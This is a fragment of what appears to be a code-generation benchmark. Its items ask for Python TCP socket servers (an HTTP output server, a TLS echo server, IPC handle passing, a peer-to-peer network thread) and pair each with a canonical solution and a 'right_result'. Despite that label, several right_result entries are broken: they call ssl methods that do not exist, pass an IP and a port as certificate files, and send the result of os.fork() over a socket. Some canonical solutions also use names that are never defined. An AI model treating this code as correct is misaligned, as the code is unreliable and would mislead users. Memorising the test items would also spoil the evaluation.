    "Instruction": "Task Description: Create a Python class that implements a basic HTTP server using TCP sockets to handle client connections, process HTTP requests, and send responses.\n\nClass Description: HTTPOutput is a class that provides functionality to create a TCP server, accept client connections, handle HTTP requests, and send responses. It includes methods for server management and HTTP protocol handling.\n\nAttributes:\n- host: str | None - The host address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to bind the server to (default: 0 for auto-selection)\n- conn: socket.socket | None - The active client connection socket\n- socket: socket.socket - The server socket\n- request: HTTPRequest | None - The parsed HTTP request object\n\nMethods:\n- addresses() -> list[str] - Property that returns available IP addresses for binding\n- urls() -> Generator[str, None, None] - Property that generates accessible URLs for the server\n- start_server() -> None - Creates and configures the server socket, binds it, and starts listening\n- accept_connection(timeout: int = 30) -> None - Accepts an incoming client connection with optional timeout\n- _open() -> None - Internal method to handle HTTP request parsing and initial response\n- _write(data: bytes) -> None - Sends data to the connected client\n- _close() -> None - Closes the current client connection\n- shutdown() -> None - Properly shuts down the server and cleans up resources",
    "Canonical_solution": "import socket\nfrom contextlib import suppress\nfrom http.server import BaseHTTPRequestHandler\nfrom io import BytesIO\n\nclass HTTPRequest(BaseHTTPRequestHandler):\n    def __init__(self, request_text):\n        self.rfile = BytesIO(request_text)\n        self.raw_requestline = self.rfile.readline()\n        self.error_code = self.error_message = None\n        self.parse_request()\n\n    def send_error(self, code, message=None, explain=None):\n        self.error_code = code\n        self.error_message = message\n\nclass HTTPOutput:\n    def __init__(self, host: str | None = \"127.0.0.1\", port: int = 0) -> None:\n        self.host = host\n        self.port = port\n        self.conn: socket.socket | None = None\n        self.socket: socket.socket = None\n        self.request = None\n\n    @property\n    def addresses(self):\n        if self.host:\n            return [self.host]\n\n        addrs = {\"127.0.0.1\"}\n        with suppress(socket.gaierror):\n            for info in socket.getaddrinfo(socket.gethostname(), self.port, socket.AF_INET):\n                addrs.add(info[4][0])\n\n        return sorted(addrs)\n\n    @property\n    def urls(self):\n        for addr in self.addresses:\n            yield f\"http://{addr}:{self.port}/\"\n\n    def start_server(self):\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.socket.bind((self.host or \"\", self.port))\n        self.socket.listen(1)\n        self.host, self.port = self.socket.getsockname()\n        if self.host == \"0.0.0.0\":\n            self.host = None\n\n    def accept_connection(self, timeout=30) -> None:\n        self.socket.settimeout(timeout)\n        try:\n            conn, _addr = self.socket.accept()\n            conn.settimeout(None)\n            self.conn = conn\n        except socket.timeout as err:\n            self.conn = None\n            raise OSError(\"Socket accept timed out\") from err\n\n    def _open(self):\n        conn = self.conn\n        if not conn:\n            raise OSError(\"No client connection\")\n\n        try:\n            req_data = conn.recv(1024)\n        except OSError as err:\n            raise OSError(\"Failed to read data from socket\") from err\n\n        req = HTTPRequest(req_data)\n        if req.command not in (\"GET\", \"HEAD\"):\n            conn.send(b\"HTTP/1.1 501 Not Implemented\\r\\n\")\n            conn.close()\n            raise OSError(f\"Invalid request method: {req.command}\")\n\n        try:\n            conn.send(b\"HTTP/1.1 200 OK\\r\\n\")\n            conn.send(b\"Server: Streamlink\\r\\n\")\n            conn.send(b\"Content-Type: video/unknown\\r\\n\")\n            conn.send(b\"\\r\\n\")\n        except OSError as err:\n            raise OSError(\"Failed to write data to socket\") from err\n\n        if req.command == \"HEAD\":\n            conn.close()\n            raise OSError\n\n        self.request = req\n\n    def _write(self, data):\n        self.conn.sendall(data)\n\n    def _close(self):\n        if self.conn:\n            with suppress(OSError):\n                self.conn.close()\n            self.conn = None\n\n    def shutdown(self) -> None:\n        self._close()\n        with suppress(OSError):\n            self.socket.shutdown(socket.SHUT_RDWR)\n        with suppress(OSError):\n            self.socket.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nfrom typing import Generator, Optional, Tuple, Union\n\nclass HTTPOutput:\n    def __init__(self, host: str = \"127.0.0.1\", port: int = 0):\n        self.host = host\n        self.port = port\n        self.conn = None\n        self.socket = None\n        self.request = None\n\n    @property\n    def addresses(self) -> list[str]:\n        return [socket.gethostbyname(socket.gethostname())]\n\n    @property\n    def urls(self) -> Generator[str, None, None]:\n        yield f\"http://{self.host}:{self.port}/\"\n\n    def start_server(self) -> None:\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.socket.bind((self.host, self.port))\n        self.socket.listen(5)\n        print(f\"Server started on {self.host}:{self.port}\")\n\n    def accept_connection(self, timeout: int = 30) -> None:\n        self.socket.settimeout(timeout)\n        try:\n            self.conn, addr = self.socket.accept()\n            print(f\"Connection from {addr}\")\n        except socket.timeout:\n            print(\"Connection timeout\")\n        finally:\n            self.socket.settimeout(None)\n\n    def _open(self) -> None:\n        if self.conn is None:\n            return\n        try:\n            data = self.conn.recv(4096)\n            if not data:\n                return\n            self.request = self._parse_request(data.decode())\n            self._write(self._generate_response())\n        except Exception as e:\n            print(f\"Error processing request: {e}\")\n        finally:\n            self._close()\n\n    def _parse_request(self, data: str) -> Optional[dict]:\n        lines = data.splitlines()\n        if not lines:\n            return None\n        first_line = lines[0].split()\n        if len(first_line) < 3:\n            return None\n        method, path, protocol = first_line\n        headers = {}\n        for line in lines[1:]:\n            if not line:\n                break\n            if line.startswith(\" \"):\n                continue\n            key, value = line.split(\":\", 1)\n            headers[key.strip()] = value.strip()\n        return {\n            \"method\": method.lower(),\n            \"path\": path,\n            \"protocol\": protocol.lower(),\n            \"headers\": headers\n        }\n\n    def _generate_response(self) -> bytes:\n        response = \"HTTP/1.1 200 OK\\r\\n\"\n        response += \"Content-Type: text/html\\r\\n\"\n        response += \"Content-Length: 12\\r\\n\"\n        response += \"\\r\\n\"\n        response += \"<h1>Hello, World!</h1>\"\n        return response.encode()\n\n    def _write(self, data: bytes) -> None:\n        if self.conn is None:\n            return\n        self.conn.sendall(data)\n\n    def _close(self) -> None:\n        if self.conn is not None:\n            self.conn.close()\n            self.conn = None\n        if self.socket is not None:\n            self.socket.close()\n            self.socket = None\n\n    def shutdown(self) -> None:\n        self._close()\n        self.socket.close()"
  },
  {
    "Task_id": 392,
    "Instruction": "Task Description: Implement a TCP server class in Python that handles client connections, data exchange, and supports various TLS/SSL configurations for secure communication.\n\nClass Description: TLSServerAutomaton is a TCP server implementation that provides secure communication capabilities with configurable TLS parameters. It handles socket creation, binding, client acceptance, data transmission, and cleanup operations.\n\nAttributes:\n\nserversocket: [socket.socket] - The main server socket object\nip_family: [int] - Address family (default: AF_INET)\nlocal_ip: [str] - Local IP address to bind to\nlocal_port: [int] - Local port to bind to\nremote_ip: [str] - Connected client's IP address\nremote_port: [int] - Connected client's port\nclient_auth: [bool] - Flag for client authentication requirement\nis_echo_server: [bool] - Flag to enable echo server behavior\nmax_client_idle_time: [int] - Maximum idle time before disconnecting (seconds)\ncurve: [str] - Preferred elliptic curve for ECDHE\npreferred_ciphersuite: [Optional[int]] - Preferred cipher suite\npreferred_signature_algorithm: [Union[str, int, None]] - Preferred signature algorithm\ncookie: [bool] - Enable DTLS cookie protection\npsk_secret: [Optional[str]] - Pre-shared key secret\npsk_mode: [Optional[str]] - Pre-shared key mode\n\nMethods:\n\nbind_socket() -> [bool] - Creates and binds the server socket, returns success status\naccept_client() -> [None] - Accepts an incoming client connection\nclose_client_socket() -> [None] - Closes the current client connection\nclose_server_socket() -> [None] - Closes the server socket\nreceive_data(timeout: Optional[int] = None) -> [Optional[bytes]] - Receives data from client with optional timeout\nsend_data(data: bytes) -> [bool] - Sends data to client, returns success status\nrun_server() -> [None] - Main server loop that handles client connections and data exchange",
    "Canonical_solution": "import socket\nfrom typing import Optional, Union\n\nclass TLSServerAutomaton:\n    def __init__(self, server=\"127.0.0.1\", sport=4433,\n                 mycert=None, mykey=None,\n                 preferred_ciphersuite: Optional[int] = None,\n                 preferred_signature_algorithm: Union[str, int, None] = None,\n                 client_auth=False,\n                 is_echo_server=True,\n                 max_client_idle_time=60,\n                 handle_session_ticket=None,\n                 session_ticket_file=None,\n                 curve=None,\n                 cookie=False,\n                 psk=None,\n                 psk_mode=None):\n\n        self.serversocket = None\n        self.ip_family = socket.AF_INET\n        self.local_ip = server\n        self.local_port = sport\n        self.remote_ip = None\n        self.remote_port = None\n\n        self.client_auth = client_auth\n        self.is_echo_server = is_echo_server\n        self.max_client_idle_time = max_client_idle_time\n        self.curve = curve\n        self.preferred_ciphersuite = preferred_ciphersuite\n        self.preferred_signature_algorithm = preferred_signature_algorithm\n        self.cookie = cookie\n        self.psk_secret = psk\n        self.psk_mode = psk_mode\n\n    def bind_socket(self):\n        s = socket.socket(self.ip_family, socket.SOCK_STREAM)\n        self.serversocket = s\n        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        try:\n            s.bind((self.local_ip, self.local_port))\n            s.listen(1)\n            return True\n        except Exception as e:\n            print(f\"Unable to bind on {self.local_ip}:{self.local_port}! ({e})\")\n            return False\n\n    def accept_client(self):\n        self.socket, addr = self.serversocket.accept()\n        if not isinstance(addr, tuple):\n            addr = self.socket.getpeername()\n        if len(addr) > 2:\n            addr = (addr[0], addr[1])\n        self.remote_ip, self.remote_port = addr\n        print(f\"Accepted connection from {self.remote_ip}:{self.remote_port}\")\n\n    def close_client_socket(self):\n        self.socket.close()\n\n    def close_server_socket(self):\n        if self.serversocket:\n            self.serversocket.close()\n\n    def receive_data(self, timeout=None):\n        if timeout:\n            self.socket.settimeout(timeout)\n        try:\n            data = self.socket.recv(4096)\n            return data if data else None\n        except socket.timeout:\n            return None\n        except Exception:\n            return None\n\n    def send_data(self, data):\n        try:\n            self.socket.sendall(data)\n            return True\n        except Exception:\n            return False\n\n    def run_server(self):\n        if not self.bind_socket():\n            return\n\n        try:\n            while True:\n                self.accept_client()\n                try:\n                    while True:\n                        data = self.receive_data(self.max_client_idle_time)\n                        if not data:\n                            break\n                        if self.is_echo_server:\n                            self.send_data(data)\n                finally:\n                    self.close_client_socket()\n        finally:\n            self.close_server_socket()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport ssl\nimport select\nimport time\nfrom typing import Optional, Union, Any\n\nclass TLSServerAutomaton:\n    def __init__(self, ip_family=socket.AF_INET, local_ip='0.0.0.0', local_port=0, client_auth=False, is_echo_server=False, max_client_idle_time=300, curve='P-256', preferred_ciphersuite=None, preferred_signature_algorithm=None, cookie=False, psk_secret=None, psk_mode=None):\n        self.serversocket = None\n        self.ip_family = ip_family\n        self.local_ip = local_ip\n        self.local_port = local_port\n        self.remote_ip = ''\n        self.remote_port = 0\n        self.client_auth = client_auth\n        self.is_echo_server = is_echo_server\n        self.max_client_idle_time = max_client_idle_time\n        self.curve = curve\n        self.preferred_ciphersuite = preferred_ciphersuite\n        self.preferred_signature_algorithm = preferred_signature_algorithm\n        self.cookie = cookie\n        self.psk_secret = psk_secret\n        self.psk_mode = psk_mode\n\n    def bind_socket(self) -> bool:\n        try:\n            self.serversocket = socket.socket(self.ip_family, socket.SOCK_STREAM)\n            self.serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            self.serversocket.bind((self.local_ip, self.local_port))\n            self.serversocket.listen(5)\n            return True\n        except Exception as e:\n            print(f\"Error binding socket: {e}\")\n            return False\n\n    def accept_client(self) -> None:\n        try:\n            self.remote_ip, self.remote_port = self.serversocket.accept()\n            self.remote_ip = self.remote_ip.getpeername()[0]\n            self.remote_port = self.remote_ip.getpeername()[1]\n        except Exception as e:\n            print(f\"Error accepting client: {e}\")\n\n    def close_client_socket(self) -> None:\n        try:\n            self.remote_ip.close()\n        except Exception as e:\n            print(f\"Error closing client socket: {e}\")\n\n    def close_server_socket(self) -> None:\n        try:\n            self.serversocket.close()\n        except Exception as e:\n            print(f\"Error closing server socket: {e}\")\n\n    def receive_data(self, timeout: Optional[int] = None) -> Optional[bytes]:\n        try:\n            if timeout is not None:\n                self.remote_ip.settimeout(timeout)\n            data = self.remote_ip.recv(4096)\n            if not data:\n                return None\n            return data\n        except Exception as e:\n            print(f\"Error receiving data: {e}\")\n            return None\n\n    def send_data(self, data: bytes) -> bool:\n        try:\n            self.remote_ip.send(data)\n            return True\n        except Exception as e:\n            print(f\"Error sending data: {e}\")\n            return False\n\n    def run_server(self) -> None:\n        if not self.bind_socket():\n            return\n\n        try:\n            while True:\n                readable, _, _ = select.select([self.serversocket], [], [])\n                if readable:\n                    self.accept_client()\n                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\n                    context.verify_mode = ssl.CERT_REQUIRED if self.client_auth else ssl.CERT_NONE\n                    context.load_cert_chain(self.local_ip, self.local_port)\n                    context.set_ciphers(self.preferred_ciphersuite)\n                    context.set_signature_algorithm(self.preferred_signature_algorithm)\n                    context.set_ec_curve_name(self.curve)\n                    context.set_cookie_enabled(self.cookie)\n                    context.set_psk_identity(self.psk_mode)\n                    context.set_psk_hint(self.psk_secret)\n                    secure_socket = context.wrap_socket(self.remote_ip, server_side=True)\n                    while True:\n                        if self.is_echo_server:\n                            data = self.receive_data()\n                            if data:\n                                self.send_data(data)\n                        else:\n                            data = self.receive_data()\n                            if data:\n                                print(f\"Received: {data.decode()}\")\n                                self.send_data(data.encode())\n                        time.sleep(1)\n        except Exception as e:\n            print(f\"Server error: {e}\")\n        finally:\n            self.close_server_socket()"
  },
  {
    "Task_id": 394,
    "Instruction": "Task Description: Implement a TCP server that accepts client connections and delegates the handling of these connections to a worker process using inter-process communication (IPC).\n\nFunction Description: The function `server` establishes a TCP server that listens for incoming client connections. When a client connects, the server sends the client's file descriptor to a pre-connected worker process using `send_handle`, allowing the worker to take over the client communication. The server then closes its end of the connection, leaving the worker to handle further interaction with the client.\n\nInput:\n- `work_address`: [str] - The address (e.g., a named pipe or network address) where the worker process is listening for connections.\n- `port`: [int] - The TCP port number on which the server should listen for incoming client connections.\n\nOutput: None (The function runs indefinitely in a loop, accepting and delegating client connections.)",
    "Canonical_solution": "from multiprocessing.connection import Listener\nfrom multiprocessing.reduction import send_handle\nimport socket\n\ndef server(work_address, port):\n    # Wait for the worker to connect\n    work_serv = Listener(work_address, authkey=b'peekaboo')\n    worker = work_serv.accept()\n    worker_pid = worker.recv()\n\n    # Now run a TCP/IP server and send clients to worker\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)\n    s.bind(('', port))\n    s.listen(1)\n    while True:\n        client, addr = s.accept()\n        print('SERVER: Got connection from', addr)\n        send_handle(worker, client.fileno(), worker_pid)\n        client.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport os\nimport fcntl\n\ndef server(work_address, port):\n    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n    try:\n        os.unlink(work_address)\n    except OSError:\n        if os.path.exists(work_address):\n            os.remove(work_address)\n    sock.bind(work_address)\n    sock.listen(5)\n    while True:\n        client_sock, client_addr = sock.accept()\n        fd = os.dup(client_sock.fileno())\n        fcntl.fcntl(fd, fcntl.F_SETFL, os.O_NONBLOCK)\n        try:\n            sock.sendall(os.fork())\n        except OSError:\n            pass\n        client_sock.close()"
  },
  {
    "Task_id": 396,
    "Instruction": "Task Description: Implement a TCP server in Python that handles multiple client connections asynchronously using sockets and selectors for efficient I/O multiplexing.\n\nClass Description: NetworkThread is a threading-based TCP server implementation that manages peer-to-peer connections, handles incoming and outgoing data, and processes network events asynchronously.\n\nAttributes:\n- pending_shutdown: [bool] - Flag indicating if the server is shutting down\n- upload_speed: [int] - Current upload speed limit\n- token: [str] - Authentication token for server connections\n- _pending_network_msgs: [deque] - Queue for pending network messages\n- _user_update_counter: [int] - Counter for user updates\n- _user_update_counters: [dict] - Dictionary of user-specific update counters\n- _upload_queue_timer_id: [int] - Timer ID for upload queue processing\n- _retry_failed_uploads_timer_id: [int] - Timer ID for retrying failed uploads\n- _message_queue: [deque] - Queue for internal messages\n- _pending_peer_conns: [dict] - Dictionary of pending peer connections\n- _pending_init_msgs: [defaultdict] - Dictionary of pending initialization messages\n- _token_init_msgs: [dict] - Dictionary of token-based initialization messages\n- _username_init_msgs: [dict] - Dictionary of username-based initialization messages\n- _user_addresses: [dict] - Dictionary mapping usernames to addresses\n- _should_process_queue: [bool] - Flag for message queue processing\n- _want_abort: [bool] - Flag for thread termination\n- _selector: [selectors.DefaultSelector] - I/O multiplexing selector\n- _listen_socket: [socket.socket] - Main listening socket\n- _listen_port: [int] - Listening port number\n- _interface_name: [str] - Network interface name\n- _interface_address: [str] - Network interface IP address\n- _portmapper: [object] - Port mapping service reference\n- _local_ip_address: [str] - Local IP address\n- _server_conn: [Connection] - Server connection object\n- _server_address: [tuple] - Server address (IP, port)\n- _server_username: [str] - Server username\n- _server_timeout_time: [float] - Server timeout timestamp\n- _server_timeout_value: [int] - Server timeout duration\n- _manual_server_disconnect: [bool] - Manual disconnect flag\n- _manual_server_reconnect: [bool] - Manual reconnect flag\n- _server_relogged: [bool] - Server reconnection flag\n- _num_sockets: [int] - Current number of active sockets\n- _last_cycle_time: [float] - Last processing cycle timestamp\n- _conns: [dict] - Dictionary of active connections\n\nMethods:\n- _create_listen_socket() -> [bool] - Creates and configures the listening socket\n- _bind_listen_port() -> [bool] - Binds the socket to the specified port and interface\n- _accept_incoming_peer_connections() -> [None] - Accepts new client connections\n- _init_peer_connection(addr: tuple, init: object, response_token: str=None) -> [None] - Initializes outgoing peer connection\n- _process_ready_sockets(current_time: float) -> [None] - Processes ready sockets using selector\n- _process_ready_input_socket(sock: socket.socket, current_time: float) -> [None] - Handles socket read events\n- _process_ready_output_socket(sock: socket.socket, current_time: float) -> [None] - Handles socket write events\n- _read_data(conn: Connection, current_time: float) -> [bool] - Reads data from connection\n- _write_data(conn: Connection, current_time: float) -> [bool] - Writes data to connection\n- _modify_connection_events(conn: Connection, io_events: int) -> [None] - Modifies socket event monitoring\n- _close_connection(conn: Connection) -> [None] - Closes and cleans up a connection\n- _close_socket(sock: socket.socket) -> [None] - Safely closes a socket\n- run() -> [None] - Main thread execution loop",
    "Canonical_solution": "import errno\nimport selectors\nimport socket\nimport time\nfrom collections import defaultdict\nfrom collections import deque\nfrom os import strerror\nfrom threading import Thread\n\nclass NetworkThread(Thread):\n    \"\"\"This is the networking thread that does all the communication with the\n    Soulseek server and peers. Communication with the core is done through\n    events.\"\"\"\n\n    __slots__ = (\"pending_shutdown\", \"upload_speed\", \"token\", \"_pending_network_msgs\",\n                 \"_user_update_counter\", \"_user_update_counters\", \"_upload_queue_timer_id\",\n                 \"_retry_failed_uploads_timer_id\")\n\n    CONNECTION_BACKLOG_LENGTH = 65535\n    ERROR_NOT_CONNECTED = OSError(errno.ENOTCONN, strerror(errno.ENOTCONN))\n    ERROR_TIMED_OUT = OSError(errno.ETIMEDOUT, strerror(errno.ETIMEDOUT))\n\n    def __init__(self):\n        super().__init__(name=\"NetworkThread\")\n        self._message_queue = deque()\n        self._pending_peer_conns = {}\n        self._pending_init_msgs = defaultdict(list)\n        self._token_init_msgs = {}\n        self._username_init_msgs = {}\n        self._user_addresses = {}\n        self._should_process_queue = False\n        self._want_abort = False\n        self._selector = None\n        self._listen_socket = None\n        self._listen_port = None\n        self._interface_name = None\n        self._interface_address = None\n        self._portmapper = None\n        self._local_ip_address = \"\"\n        self._server_conn = None\n        self._server_address = None\n        self._server_username = None\n        self._server_timeout_time = None\n        self._server_timeout_value = -1\n        self._manual_server_disconnect = False\n        self._manual_server_reconnect = False\n        self._server_relogged = False\n        self._num_sockets = 0\n        self._last_cycle_time = 0\n        self._conns = {}\n\n    def _create_listen_socket(self):\n        self._listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self._listen_socket.setblocking(False)\n        self._num_sockets += 1\n\n        if sys.platform != \"win32\":\n            self._listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n\n        if not self._bind_listen_port():\n            self._close_listen_socket()\n            return False\n\n        self._selector.register(self._listen_socket, selectors.EVENT_READ)\n        return True\n\n    def _bind_listen_port(self):\n        if not self._bind_socket_interface(self._listen_socket):\n            return False\n\n        try:\n            ip_address = self._interface_address or self._find_local_ip_address()\n            self._listen_socket.bind((ip_address, self._listen_port))\n            self._listen_socket.listen(self.CONNECTION_BACKLOG_LENGTH)\n        except OSError as error:\n            self._listen_port = None\n            return False\n\n        self._local_ip_address = ip_address\n        return True\n\n    def _accept_incoming_peer_connections(self):\n        while True:\n            try:\n                incoming_sock, incoming_addr = self._listen_socket.accept()\n                incoming_sock.setblocking(False)\n                incoming_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n            except OSError as error:\n                if error.errno == errno.EWOULDBLOCK:\n                    break\n                continue\n\n            io_events = selectors.EVENT_READ\n            conn = self._conns[incoming_sock] = PeerConnection(\n                sock=incoming_sock, addr=incoming_addr, io_events=io_events\n            )\n            self._num_sockets += 1\n            self._selector.register(incoming_sock, io_events)\n            conn.is_established = True\n\n    def _init_peer_connection(self, addr, init, response_token=None):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        io_events = selectors.EVENT_READ | selectors.EVENT_WRITE\n        conn = PeerConnection(\n            sock=sock, addr=addr, io_events=io_events,\n            init=init, request_token=None, response_token=response_token\n        )\n\n        sock.setblocking(False)\n        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n\n        try:\n            self._bind_socket_interface(sock)\n            sock.connect_ex(addr)\n        except OSError as error:\n            self._close_socket(sock)\n            return\n\n        init.sock = sock\n        self._conns[sock] = conn\n        self._selector.register(sock, io_events)\n        self._num_sockets += 1\n\n    def _process_ready_sockets(self, current_time):\n        if self._listen_socket is None:\n            return\n\n        for key, io_events in self._selector.select(timeout=0.05):\n            sock = key.fileobj\n\n            if io_events & selectors.EVENT_READ:\n                if sock is self._listen_socket:\n                    self._accept_incoming_peer_connections()\n                    continue\n                self._process_ready_input_socket(sock, current_time)\n\n            if io_events & selectors.EVENT_WRITE:\n                self._process_ready_output_socket(sock, current_time)\n\n    def _process_ready_input_socket(self, sock, current_time):\n        conn = self._conns.get(sock)\n        if not conn:\n            return\n\n        try:\n            if self._read_data(conn, current_time):\n                self._process_conn_incoming_messages(conn)\n                return\n        except OSError as error:\n            pass\n\n        self._close_connection(conn)\n\n    def _process_ready_output_socket(self, sock, current_time):\n        conn = self._conns.get(sock)\n        if not conn:\n            return\n\n        if not conn.is_established:\n            if conn is self._server_conn:\n                self._establish_outgoing_server_connection(conn)\n            else:\n                self._establish_outgoing_peer_connection(conn)\n            return\n\n        try:\n            if not self._write_data(conn, current_time):\n                self._close_connection(conn)\n        except (OSError, ValueError):\n            self._close_connection(conn)\n\n    def _read_data(self, conn, current_time):\n        data = conn.sock.recv(conn.recv_size)\n        if not data:\n            return False\n\n        conn.in_buffer += data\n        conn.last_active = current_time\n        return True\n\n    def _write_data(self, conn, current_time):\n        num_bytes_sent = conn.sock.send(conn.out_buffer)\n        del conn.out_buffer[:num_bytes_sent]\n\n        if not conn.out_buffer:\n            self._modify_connection_events(conn, selectors.EVENT_READ)\n\n        conn.last_active = current_time\n        return True\n\n    def _modify_connection_events(self, conn, io_events):\n        if conn.io_events != io_events:\n            self._selector.modify(conn.sock, io_events)\n            conn.io_events = io_events\n\n    def _close_connection(self, conn):\n        if not conn:\n            return\n\n        sock = conn.sock\n        del self._conns[sock]\n\n        self._selector.unregister(sock)\n        self._close_socket(sock)\n        self._num_sockets -= 1\n\n    @staticmethod\n    def _close_socket(sock):\n        try:\n            sock.shutdown(socket.SHUT_RDWR)\n        except OSError:\n            pass\n        sock.close()\n\n    def run(self):\n        self._selector = selectors.DefaultSelector()\n        try:\n            while not self._want_abort:\n                current_time = time.monotonic()\n                self._process_queue_messages()\n                self._process_ready_sockets(current_time)\n                time.sleep(0.004)\n        finally:\n            self._selector.close()\n\nclass Connection:\n    __slots__ = (\"sock\", \"addr\", \"io_events\", \"is_established\", \"in_buffer\", \"out_buffer\",\n                 \"last_active\", \"recv_size\")\n\n    def __init__(self, sock=None, addr=None, io_events=None):\n        self.sock = sock\n        self.addr = addr\n        self.io_events = io_events\n        self.in_buffer = bytearray()\n        self.out_buffer = bytearray()\n        self.last_active = time.monotonic()\n        self.recv_size = 51200\n        self.is_established = False\n\nclass PeerConnection(Connection):\n    __slots__ = (\"init\", \"request_token\", \"response_token\", \"has_post_init_activity\")\n\n    def __init__(self, *args, init=None, request_token=None, response_token=None, **kwargs):\n        Connection.__init__(self, *args, **kwargs)\n        self.init = init\n        self.request_token = request_token\n        self.response_token = response_token\n        self.has_post_init_activity = False",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport selectors\nimport threading\nimport time\nfrom collections import deque, defaultdict\n\nclass NetworkThread:\n    def __init__(self):\n        self.pending_shutdown = False\n        self.upload_speed = 0\n        self.token = \"\"\n        self._pending_network_msgs = deque()\n        self._user_update_counter = 0\n        self._user_update_counters = {}\n        self._upload_queue_timer_id = 0\n        self._retry_failed_uploads_timer_id = 0\n        self._message_queue = deque()\n        self._pending_peer_conns = {}\n        self._pending_init_msgs = defaultdict(dict)\n        self._token_init_msgs = {}\n        self._username_init_msgs = {}\n        self._user_addresses = {}\n        self._should_process_queue = False\n        self._want_abort = False\n        self._selector = selectors.DefaultSelector()\n        self._listen_socket = None\n        self._listen_port = 0\n        self._interface_name = \"\"\n        self._interface_address = \"\"\n        self._portmapper = None\n        self._local_ip_address = \"\"\n        self._server_conn = None\n        self._server_address = ()\n        self._server_username = \"\"\n        self._server_timeout_time = 0.0\n        self._server_timeout_value = 0\n        self._manual_server_disconnect = False\n        self._manual_server_reconnect = False\n        self._server_relogged = False\n        self._num_sockets = 0\n        self._last_cycle_time = 0.0\n        self._conns = {}\n\n    def _create_listen_socket(self):\n        try:\n            self._listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self._listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            self._listen_socket.setblocking(False)\n            return True\n        except Exception as e:\n            print(f\"Error creating listen socket: {e}\")\n            return False\n\n    def _bind_listen_port(self):\n        try:\n            self._listen_socket.bind((self._interface_address, self._listen_port))\n            self._listen_socket.listen(5)\n            self._selector.register(self._listen_socket, selectors.EVENT_READ, data=None)\n            return True\n        except Exception as e:\n            print(f\"Error binding listen port: {e}\")\n            return False\n\n    def _accept_incoming_peer_connections(self):\n        try:\n            client_socket, client_address = self._listen_socket.accept()\n            client_socket.setblocking(False)\n            self._selector.register(client_socket, selectors.EVENT_READ, data=None)\n            self._pending_peer_conns[client_address] = client_socket\n            return True\n        except Exception as e:\n            print(f\"Error accepting incoming peer connections: {e}\")\n            return False\n\n    def _init_peer_connection(self, addr, init, response_token=None):\n        try:\n            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            client_socket.setblocking(False)\n            client_socket.connect(addr)\n            self._selector.register(client_socket, selectors.EVENT_READ, data=None)\n            self._pending_peer_conns[addr] = client_socket\n            return True\n        except Exception as e:\n            print(f\"Error initializing peer connection: {e}\")\n            return False\n\n    def _process_ready_sockets(self, current_time):\n        for key, mask in self._selector.select(current_time - self._last_cycle_time):\n            sock = key.fileobj\n            event_type = key.data.get('event_type', None)\n            if event_type == 'read':\n                self._process_ready_input_socket(sock, current_time)\n            elif event_type == 'write':\n                self._process_ready_output_socket(sock, current_time)\n\n    def _process_ready_input_socket(self, sock, current_time):\n        try:\n            data = sock.recv(4096)\n            if data:\n                conn = self._conns.get(sock, None)\n                if conn:\n                    self._read_data(conn, current_time)\n        except Exception as e:\n            print(f\"Error processing input socket: {e}\")\n            self._close_connection(conn)\n\n    def _process_ready_output_socket(self, sock, current_time):\n        try:\n            if self._conns.get(sock, None):\n                self._write_data(self._conns[sock], current_time)\n        except Exception as e:\n            print(f\"Error processing output socket: {e}\")\n            self._close_connection(self._conns.get(sock, None))\n\n    def _read_data(self, conn, current_time):\n        try:\n            data = conn.sock.recv(4096)\n            if data:\n                conn.data_received(data)\n        except Exception as e:\n            print(f\"Error reading data: {e}\")\n            self._close_connection(conn)\n\n    def _write_data(self, conn, current_time):\n        try:\n            if conn.queue:\n                msg = conn.queue.popleft()\n                conn.sock.send(msg)\n        except Exception as e:\n            print(f\"Error writing data: {e}\")\n            self._close_connection(conn)\n\n    def _modify_connection_events(self, conn, io_events):\n        try:\n            self._selector.modify(conn.sock, io_events, data=conn)\n        except Exception as e:\n            print(f\"Error modifying connection events: {e}\")\n            self._close_connection(conn)\n\n    def _close_connection(self, conn):\n        try:\n            if conn and conn.sock:\n                self._selector.unregister(conn.sock)\n                self._close_socket(conn.sock)\n                del self._conns[conn.sock]\n        except Exception as e:\n            print(f\"Error closing connection: {e}\")\n\n    def _close_socket(self, sock):\n        try:\n            sock.close()\n        except Exception as e:\n            print(f\"Error closing socket: {e}\")\n\n    def run(self):\n        while not self._want_abort:\n            if not self._pending_shutdown:\n                if not self._create_listen_socket():\n                    break\n                if not self._bind_listen_port():\n                    break\n                self._last_cycle_time = time.time()\n                self._should_process_queue = True\n                while not self._want_abort:\n                    if self._should_process_queue:\n                        self._process_ready_sockets(time.time())\n                        self._should_process_queue = False\n                    time.sleep(0.1)"
  },
  {
    "Task_id": 397,
